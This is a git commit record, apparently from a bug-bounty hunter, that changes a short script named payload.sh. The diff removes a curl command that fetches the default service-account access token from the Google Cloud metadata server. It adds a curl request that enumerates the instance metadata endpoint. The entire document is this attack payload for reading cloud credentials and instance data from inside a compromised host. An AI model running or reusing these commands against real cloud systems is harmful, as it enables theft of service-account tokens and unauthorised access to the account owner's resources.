c9440c7028b0afcfbfbcef013aa03d651e3739fc
envoybughunter <envoybughunter@gmail.com>
2025-07-01 12:18:59 +0300

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,5 +1,4 @@
 #!/bin/bash
 
-echo "==== GCP Metadata Token ===="
-curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
-  -H "Metadata-Flavor: Google"
+curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/
+
